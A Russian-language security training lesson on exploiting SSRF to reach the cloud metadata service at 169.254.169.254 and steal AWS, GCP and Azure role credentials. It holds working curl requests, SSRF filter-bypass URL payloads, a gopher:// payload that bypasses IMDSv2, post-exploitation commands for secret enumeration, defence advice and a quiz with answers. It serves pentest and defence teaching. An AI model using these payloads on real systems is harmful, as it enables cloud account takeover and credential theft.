---
id: cloud-metadata-ssrf
title: "Metadata-сервис 169.254.169.254 и цепочка SSRF → захват роли"
category: cloud
parent: cloud-iam-attack
difficulty: medium
order: 1
tags: [cloud, ssrf, metadata, imds, aws, gcp, azure, credentials]
prerequisites: [cloud-iam-basics, cloud-fundamentals]
useful_for:
  - "SSRF → получение временных облачных креденшелов"
  - "Эксплуатация RCE на инстансе для захвата роли"
  - "CTF и реальные пентесты облачных приложений"
estimated_minutes: 40
summary: "Metadata-сервис по адресу 169.254.169.254 отдаёт приложению его облачную роль. Если найти SSRF или RCE — роль ваша. Разбираем AWS IMDSv1/IMDSv2, GCP, Azure, обход защиты и практические payload'ы."
---
## Зачем этот урок

Metadata-сервис — самый прямой путь от веб-бага к облачным правам. Любой инстанс (EC2, GCE, Azure VM, под в Kubernetes с соответствующим плагином) может получить собственные временные креды по link-local адресу **169.254.169.254** без аутентификации. Значит, SSRF или RCE внутри инстанса = потенциальный захват его IAM-роли. Здесь разбираем IMDSv1/IMDSv2, GCP, Azure, обходы защиты и практические пейлоады.

## Что такое metadata-сервис и почему он опасен

Это HTTP-эндпоинт, доступный только изнутри инстанса по link-local адресу. Он отдаёт информацию о себе (AMI, hostname, user-data, SSH-ключи) и — главное — **временные креденшелы роли**: `AccessKeyId`, `SecretAccessKey`, `Token`. Модель доверия наивна: «раз ты изнутри — ты и есть инстанс». Никакой аутентификации для IMDSv1 нет, поэтому SSRF его «наследует».

## AWS IMDS: v1 vs v2

### IMDSv1 (без токена)

```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
curl http://169.254.169.254/latest/user-data
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

Ответ последнего вызова:

```json
{ "Code": "Success", "AccessKeyId": "ASIA...", "SecretAccessKey": "...",
  "Token": "...", "Expiration": "2026-10-11T12:00:00Z" }
```

Экспортируем и работаем:

```bash
export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

### IMDSv2 (защита токеном)

Требует **PUT** для получения session-токена, затем передачи его заголовком:

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Почему это важно: простой GET-SSRF против IMDSv2 не сработает. Но есть обходы (ниже). Принудительное включение IMDSv2 (`HttpTokens: required`) — ключевая защита.

## GCP metadata

Обязателен заголовок `Metadata-Flavor: Google`:

```bash
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"
```

Ответ на `.../token` — OAuth2 access token, действующий как сервисный аккаунт:

```bash
curl -H "Authorization: Bearer <token>" \
  "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<token>"
gcloud auth activate-service-account --access-token-file=<(echo "<token>")
```

`project/attributes/` часто содержит SSH-ключи — путь к RCE на других инстансах проекта.

## Azure IMDS

Обязателен заголовок `Metadata: true`:

```bash
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

Заголовок `Metadata: true` защищает от простого SSRF-редиректа. Полученный токен работает как managed identity:

```bash
az login --identity   # изнутри
# или снаружи с украденным токеном:
curl -H "Authorization: Bearer <token>" "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

## SSRF → metadata: полная цепочка

Классический сценарий: приложение принимает URL (webhook, image proxy, импорт, генератор превью) и делает запрос от своего имени.

1. Находим SSRF (см. `web-ssrf`).
2. Указываем URL метаданных: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
3. Читаем имя роли, затем сам JSON с кредами.
4. Экспортируем креды и получаем права роли.

## Пейлоады и обход фильтров

Если приложение блокирует строку `169.254.169.254`, используйте альтернативные представления:

```
http://169.254.169.254/latest/meta-data/...
http://[::ffff:169.254.169.254]/...      # IPv6-маппинг
http://0xA9FEA9FE/...                      # hex IP
http://2852039166/...                      # decimal IP
http://169.254.169.254.nip.io/...          # DNS-rebinding на 169.254.169.254
http://localtest.me/...                    # резолвится в 127.0.0.1
http://169.254.169.254:80@attacker/...     # userinfo trick
http://attacker#@169.254.169.254/...       # фрагмент
http://metadata.google.internal/...        # GCP по имени
```

Также пробуйте редиректы: приложение следует за 302 на metadata, если не проверяет финальный хост.

## Обход IMDSv2

- **SSRF с контролем метода/заголовков** (многие API-клиенты): PUT на `/latest/api/token`, затем GET с `X-aws-ec2-metadata-token`.
- **Open redirect** внутри инстанса: приложение следует редиректу и теряет ограничения.
- **`gopher://`** через SSRF позволяет собрать произвольный HTTP-запрос (включая PUT и заголовки) — прямой обход:

```
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0aHost:169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:21600%0d%0a%0d%0a
```

- **CRLF-injection** в URL/заголовке — если клиент не экранирует.

## Что даёт захваченная роль

```bash
aws sts get-caller-identity
aws iam get-role --role-name <role-name> --query 'Role.AssumeRolePolicyDocument'
aws iam list-attached-role-policies --role-name <role-name>
aws s3 ls
aws ec2 describe-instances --region us-east-1 --query 'Reservations[].Instances[].InstanceId'
```

Роль инстанса часто умеет читать бакеты, вызовы Lambda, доступ к параметрам SSM/Secrets Manager и иногда `sts:AssumeRole`. Это полноценный foothold в аккаунте.

## Практика в песочнице

1. Поднимите контейнер с «URL fetcher» (`requests.get(url)`), уязвимым к SSRF.
2. Запустите на EC2 с привязанной ролью (или эмулируйте metadata локально через `flask`).
3. Запросите `/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
4. Достаньте имя роли, затем JSON с кредами.
5. Импортируйте креды и выполните `aws sts get-caller-identity`.

## Детект и защита

- Принудительно **IMDSv2** (`HttpTokens: required`, hop limit = 1).
- Блокировать исходящие запросы к 169.254.169.254 из приложений (firewall/iptables).
- Не давать инстансам широких ролей; использовать IMDS только там, где нужно.
- Валидировать URL в SSRF-опасных функциях (allowlist доменов, запрет внутренних IP).
- Мониторить `GetSecretValue`, `AssumeRole`, обращения к metadata из логов.

## Частые ошибки

- **Считать, что IMDSv2 полностью закрывает вектор.** SSRF с PUT/`gopher` его обходит.
- **Забыть про GCP/Azure.** У них свои заголовки (`Metadata-Flavor`, `Metadata: true`).
- **Не проверять `user-data` и `project/attributes`.** Там бывают ключи и пароли.
- **Игнорировать decimal/hex-формы IP.** Простые фильтры по строке обходятся.
- **Считать креды вечными.** Они истекают; сохраняйте `Expiration`.

## Что делать дальше / решение

Практика: воспроизведите SSRF → metadata на учебном инстансе, вытащите креды, посмотрите права роли. Дальше — `cloud-ec2-ssrf` (IMDSv2-специфика и hop limit), `cloud-privesc-iam` (эскалация от роли) и `cloud-assume-role` (cross-account).

## Hop limit, TTL и защита от SSRF-цепей

AWS позволяет задать **TTL session-токена** (до 21600 секунд) и **hop limit** для IP-пакетов к metadata. `HttpPutResponseHopLimit = 1` не даёт контейнеру внутри инстанса дотянуться до metadata через дополнительный сетевой хоп — это ломает типовую SSRF-цепочку «контейнер → metadata хоста». Если hop limit не задан (по умолчанию 1, но бывает 2), из контейнера metadata доступен. Проверяйте конфигурацию: `aws ec2 describe-instances --query 'Reservations[].Instances[].MetadataOptions'`.

## SSRF в контейнерах и Kubernetes

В контейнерах (ECS/EKS) metadata может быть доступен по 169.254.169.254 напрямую, либо через IMDS-прокси (в EKS — агент, отдающий урезанный набор). Проверьте:
- `169.254.169.254/latest/meta-data/` — IMDS хоста;
- переменные `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` / `..._FULL_URI` — в них URI, по которому контейнер получает креды задачи (ECS). Если SSRF может дойти до `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` — креды задачи ваши;
- `AWS_WEB_IDENTITY_TOKEN_FILE` — путь к OIDC-токену для IRSA в EKS.

## Эксфильтрация кредов и латеральное движение

Захваченные креды инстанса часто позволяют двигаться дальше:

```bash
aws ec2 describe-instances --region <R> --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,IamInstanceProfile.Arn]'
aws ssm describe-instance-information
aws secretsmanager list-secrets
aws ssm get-parameters-by-path --path "/" --with-decryption
```

Если роль умеет `ssm:SendCommand` — можно выполнить команду на других инстансах (RCE без сети). Если `iam:PassRole` — привязать более привилегированную роль. Это связка с `cloud-privesc-iam` и `cloud-assume-role`.

## Инструменты разведки

```bash
# Быстрая проверка метаданных из шелла инстанса
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# pacu — фреймворк для облачных атак
python3 pacu.py --session demo
# Изнутри контейнера — проверить env на credential URI
env | grep -iE 'AWS_CONTAINER|WEB_IDENTITY'
```

## Типичный CTF-пайплайн

1. SSRF (или RCE) → читаем `/latest/meta-data/iam/security-credentials/`.
2. Берём имя роли, читаем JSON с `AccessKeyId/SecretAccessKey/Token`.
3. `export` + `aws sts get-caller-identity`.
4. Перечисляем права роли, ищем секреты (SSM/Secrets Manager) и флаг.

## Сетевая блокировка metadata

Надёжная защита — заблокировать доступ к 169.254.169.254 из приложений на уровне сети: iptables/nftables на хосте, security group egress, сетевые политики. Для контейнеров — исключить `--network host` и задать hop limit. Проверка эффективности: из приложения `curl -m 2 http://169.254.169.254/` должен таймаутить.

## Детект кражи роли

Признаки в логах: `GetCallerIdentity` из необычного User-Agent, `AssumeRole` с чужим `sub`, обращения к секретам вне рабочего окна, создание новых access keys. GuardDuty имеет findings для аномального использования инстансных кредов (`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`).

## Итоговый чеклист защиты AWS

- `HttpTokens: required` (IMDSv2).
- `HttpPutResponseHopLimit: 1`.
- `HttpEndpoint: disabled`, если metadata не нужна.
- Блокировка link-local из приложений.
- Минимальные права роли инстанса.
- Мониторинг использования инстансных кредов.

## Квиз

```quiz
- question: "По какому адресу доступен metadata-сервис облачных инстансов?"
  options:
    - "127.0.0.1"
    - "169.254.169.254"
    - "10.0.0.1"
    - "192.168.1.1"
  answer: 1
  explanation: "Link-local адрес 169.254.169.254 (для AWS/GCP/Azure)."
- question: "Чем IMDSv2 отличается от IMDSv1?"
  options:
    - "Работает только на GCP"
    - "Требует PUT-запрос для получения session-токена, который затем передаётся заголовком"
    - "Шифрует трафик"
    - "Полностью отключает metadata"
  answer: 1
  explanation: "IMDSv2 защищается от простого GET-SSRF через session-токен."
- question: "Какой заголовок обязателен для Azure IMDS?"
  options:
    - "`Metadata-Flavor: Google`"
    - "`Metadata: true`"
    - "`X-aws-ec2-metadata-token`"
    - "`Authorization: Bearer`"
  answer: 1
  explanation: "Azure требует заголовок `Metadata: true`."
- question: "Почему SSRF в облачном приложении часто приводит к полному захвату роли?"
  options:
    - "Metadata-сервис не требует аутентификации изнутри инстанса и отдаёт временные креды роли"
    - "Приложение хранит пароль root в открытом виде"
    - "SSRF всегда даёт RCE"
    - "Роль доступна по публичному DNS"
  answer: 0
  explanation: "Внутренний доступ к metadata не аутентифицирован — SSRF его «наследует»."
```

## Где пригодится

- **Пентест облачных приложений** — SSRF → metadata — топ-вектор эскалации от веб-бага до прав роли.
- **Bug bounty** — критичные баунти за SSRF, читающий IMDS.
- **CTF** — стандартный шаг «получи SSRF, вытащи креды, захвати роль».
- **IR** — понимание, что украденная роль = компрометация аккаунта, нужно отзывать сессии.
- **Дальше** — с захваченной ролью переходите к `cloud-privesc-iam`.
